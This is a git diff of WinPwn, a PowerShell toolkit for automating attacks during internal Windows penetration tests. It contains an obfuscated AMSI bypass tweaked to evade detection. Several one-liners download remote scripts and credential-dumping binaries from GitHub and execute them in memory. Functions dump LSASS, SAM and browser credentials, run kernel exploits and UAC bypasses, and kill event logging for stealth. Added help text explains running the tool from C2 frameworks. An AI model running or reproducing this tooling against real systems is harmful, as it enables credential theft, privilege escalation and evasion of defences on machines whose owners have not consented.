@@ -2,7 +2,7 @@
 function AmsiBypass
 {
     #This is Matt Graebers Reflection method bypass with changes to triggers 
-    (([Ref].Assembly.gettypes() | ? {$_.Name -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBt'+'AHMAaQA'+'qAHQAaQB'+'sAHMA')))}).GetFields($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('T'+'gB'+'vAG4AUAB1AGIAb'+'ABpAGMALABTAHQAYQB0A'+'GkAYwA=')))) | ? {$_.Name -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('Y'+'QBtAHMA'+'aQBJAG4Aa'+'QB0ACoAYQB'+'pAGwAZQ'+'BkAA==')))}).SetValue($null,$true)
+    (([Ref].Assembly.gettypes() | ? {$_.Name -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBAsE64String('QQBt'+'AHMAaQA'+'qAHQAaQB'+'sAHMA')))}).GetFields($([Text.Encoding]::Unicode.GetString([Convert]::FromBAsE64String('T'+'gB'+'vAG4AUAB1AGIAb'+'ABpAGMALABTAHQAYQB0A'+'GkAYwA=')))) | ? {$_.Name -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBAsE64String('Y'+'QBtAHMA'+'aQBJAG4Aa'+'QB0ACoAYQB'+'pAGwAZQ'+'BkAA==')))}).SetValue($null,$true)
 }
 
 function dependencychecks
@@ -390,7 +390,7 @@ function adidns
            
 }
 
-function sessionGopher 
+function SessionGopher 
 {
     <#
     .DESCRIPTION
@@ -455,7 +455,7 @@ function sessionGopher
 }
 
 
-function kittielocal 
+function Kittielocal 
 {
     <#
     .DESCRIPTION
@@ -585,7 +585,7 @@ __        ___       ____
         }
         While ($masterquestion -ne 12)
 }
-function decryptteamviewer
+function Decryptteamviewer
 {
  param(
         [switch]
@@ -625,7 +625,7 @@ function SharpCloud
     else{Invoke-SharpCloud -Command all}
 }
 
-function safedump
+function Safedump
 {
  param(
         [switch]
@@ -640,7 +640,7 @@ function safedump
     Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Ghostpack/SafetyKatz.exe?raw=true
 }
     
-function obfuskittiedump
+function Obfuskittiedump
 {
  param(
         [switch]
@@ -658,7 +658,7 @@ function obfuskittiedump
         Start-Sleep -Seconds 5
     }else{Invoke-TheKatz}
 }
-function wificreds
+function Wificreds
 {
  param(
         [switch]
@@ -677,7 +677,7 @@ function wificreds
     }else{Get-WLAN-Keys}
 }
     
-function kittenz
+function Kittenz
 {
  param(
         [switch]
@@ -696,7 +696,7 @@ function kittenz
     }else{inbox | out-string -Width 5000}
 }
     
-function samfile
+function Samfile
 {
  param(
         [switch]
@@ -715,7 +715,7 @@ function samfile
     }else{Invoke-PowerDump}
 }
 
-function dumplsass
+function Dumplsass
 {
 <#
         .DESCRIPTION
@@ -764,7 +764,7 @@ function dumplsass
     else{Write-Host "No Admin rights, start again using a privileged session!"}
 }
 
-function kernelexploits
+function Kernelexploits
 {
 <#
         .DESCRIPTION
@@ -904,7 +904,7 @@ function ms15-077
     
 
 }
-function juicypot
+function Juicypot
 {
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     testtemp
@@ -1001,7 +1001,7 @@ function ms16-135
     iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/ms16-135.ps1')
 }
 
-function localreconmodules
+function Localreconmodules
 {
 <#
         .DESCRIPTION
@@ -1088,7 +1088,7 @@ __        ___       ____
  While ($masterquestion -ne 10)
 }
 
-function generalrecon{
+function Generalrecon{
     Param (
     [Switch]
     $consoleoutput,
@@ -1356,7 +1356,7 @@ function generalrecon{
 }
 
 # Looking for Event logs via  djhohnsteins c# eventlog parser ported to powershell
-function powershellsensitive
+function Powershellsensitive
 {
     Param (
 [Switch]
@@ -1383,7 +1383,7 @@ $noninteractive
     }
 }
 
-function dotnet{
+function Dotnet{
    Param (
 [Switch]
 $consoleoutput,
@@ -1398,7 +1398,7 @@ $noninteractive
     if(!$consoleoutput){Get-DotNetServices  >> "$currentPath\LocalRecon\DotNetBinaries.txt"}else{Get-DotNetServices}
 }
 
-function morerecon{
+function Morerecon{
     Param (
 [Switch]
 $consoleoutput,
@@ -1419,7 +1419,7 @@ $noninteractive
     }
 }
 
-function sensitivefiles{
+function Sensitivefiles{
     Param (
     [Switch]
     $consoleoutput,
@@ -1457,7 +1457,7 @@ function sensitivefiles{
     }
 }
 
-function browserpwn{
+function Browserpwn{
     Param (
    [Switch]
     $consoleoutput,
@@ -1536,7 +1536,7 @@ function Get-IndexedFiles
      }
 }
 
-function dotnetsearch
+function Dotnetsearch
 {
     Param (
    [Switch]
@@ -1701,7 +1701,7 @@ __        ___       ____
 
 }
 
-function passhunt
+function Passhunt
 {
 <#
         .DESCRIPTION
@@ -1787,7 +1787,7 @@ g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.
 }
 
 
-function domainreconmodules
+function Domainreconmodules
 {
 <#
         .DESCRIPTION
@@ -2067,7 +2067,7 @@ if(!$consoleoutput){
 	if(!$consoleoutput){rewires -LocalGroup RDP -Identity $env:Username -domain $domain  >> "$currentPath\DomainRecon\RDPAccess_Systems.txt"}else{rewires -LocalGroup RDP -Identity $env:Username -domain $domain} 
 }
 
-function domainshares
+function Domainshares
 {
   @'
 
@@ -2136,7 +2136,7 @@ function Snaffler
     }
 }
 
-function spoolvulnscan
+function Spoolvulnscan
 {
     #leechristensens Spoolsample scanner & Exploitation
 
@@ -2294,7 +2294,7 @@ function RBCD-Check
     }
 }
 
-function printercheck
+function Printercheck
 {
     [CmdletBinding()]
     Param (
@@ -2358,7 +2358,7 @@ function reconAD
     cmd /c start powershell -Command {"$currentPath\DomainRecon\ADrecon\recon.ps1"}
 }
 
-function bluekeep
+function Bluekeep
 {
 <#
         .DESCRIPTION
@@ -2514,7 +2514,7 @@ function MS17-10
 
 }
 
-function powerSQL
+function PowerSQL
 {
 <#
         .DESCRIPTION
@@ -2608,7 +2608,7 @@ function Get-currentIP
     return $IPaddress
 }
 
-function sharphound
+function Sharphound
 {
 <#
         .DESCRIPTION
@@ -2964,7 +2964,7 @@ function Reg1c1de
 	Invoke-Reg1c1de
 }
 
-function privescmodules
+function Privescmodules
 {
 <#
         .DESCRIPTION
@@ -3033,7 +3033,7 @@ __        ___       ____
 
 }
 
-function lazagnemodule
+function laZagnemodule
 {
     <#
         .DESCRIPTION
@@ -3103,7 +3103,7 @@ function latmov
     }
 }
 
-function domainpassspray
+function Domainpassspray
 {
     <#
         .DESCRIPTION
@@ -3198,7 +3198,7 @@ function launcher
     }
 }
 
-function shareenumeration
+function Shareenumeration
 {
     <#
         .DESCRIPTION
@@ -3298,7 +3298,7 @@ function proxydetect
     else {Write-Host -ForegroundColor Yellow 'No proxy detected, continuing... '}
 }
 
-function kerberoasting
+function Kerberoasting
 {
     [CmdletBinding()]
     Param (
@@ -3591,7 +3591,7 @@ Function Get-Installedsoftware {
     }
 }
 
-function lapschecks
+function Lapschecks
 {
     [CmdletBinding()]
     Param (
@@ -3625,7 +3625,7 @@ function fruit
     invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Find-Fruit.ps1'');$network = Read-Host -Prompt ''Please enter the CIDR for the network: (example:192.168.0.0/24)'';Write-Host -ForegroundColor Yellow ''Searching...'';Find-Fruit -FoundOnly -Rhosts $network}'
 }
 
-function mimiload
+function Mimiload
 {
 	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/loadmimi.ps1')
 	mimiload
@@ -3647,6 +3647,7 @@ function WinPwn
     #>
          [CmdletBinding()]
     Param (
+		[alias("help")][Switch]$h,
         [Switch]
         $noninteractive,
         [Switch]
@@ -3697,6 +3698,41 @@ __        ___       ____
    --> Automate some internal Penetrationtest processes
 
 '@
+
+	$Help = "
+
+
+Usage:
+
+
+
+WinPwn without any parameters is meant to be used in an interactive shell. There is a guided menu - no need for explanations.
+
+However you can pass several parameters to use it from your favorite C2-Framework. 
+
+  -noninteractive 	-> No questions for functions so that they run with predefined or user defined parameters  
+            
+  -consoleoutput    -> The loot/report folders are not created. Every function returns the output to the console so that you can take a look at everything in the Agent logs of your C2-Framework 
+
+
+
+Examples:
+
+
+
+WinPwn -noninteractive -consoleoutput -DomainRecon 		-> This will return every single domain recon script and function and will probably give you really much output
+
+WinPwn -noninteractive -consoleoutput -Localrecon 		-> This will enumerate as much information for the local system as possible
+														   
+Generalrecon -noninteractive							-> Execute basic local recon functions and store the output in the corresponding folders
+
+UACBypass -noninteractive -command 'C:\temp\stager.exe' -technique ccmstp	-> Execute a stager in  a high integrity process from a low privileged session
+Kittielocal -noninteractive -consoleoutput -browsercredentials				-> Dump Browser-Credentials via Sharpweb returning the output to console
+Kittielocal -noninteractive -browsercredentials								-> Dump SAM File NTLM-Hashes and store the output in a file
+WinPwn -PowerSharpPack -consoleoutput -noninteractive					    -> Execute Seatbelt, PowerUp, Watson and more C# binaries in memory
+"
+	if($h){return $Help}
+	
     if(!$consoleoutput)
     {
         dependencychecks
@@ -3778,12 +3814,12 @@ __        ___       ____
         Write-Host -ForegroundColor Green '2. Local recon menu! '
         Write-Host -ForegroundColor Green '3. Domain recon menu! '
         Write-Host -ForegroundColor Green '4. Local privilege escalation check menu! '
-        Write-Host -ForegroundColor Green '5. Get SYSTEM using Windows Kernel Exploits! '
+        Write-Host -ForegroundColor Green '5. Get SYSTEM using Windows vulnerabilities! '
 	    Write-Host -ForegroundColor Green '6. Bypass UAC! '
 	    Write-Host -ForegroundColor Green '7. Get a SYSTEM Shell! '
         Write-Host -ForegroundColor Green '8. Kerberoasting! '
         Write-Host -ForegroundColor Green '9. Loot local Credentials! '
-        Write-Host -ForegroundColor Green '10. Create an ADIDNS node! '
+        Write-Host -ForegroundColor Green '10. Create an ADIDNS node or remove it! '
         Write-Host -ForegroundColor Green '11. Sessiongopher! '
         Write-Host -ForegroundColor Green '12. Kill the event log services for stealth! '
 	    Write-Host -ForegroundColor Green '13. PowerSharpPack menu!'
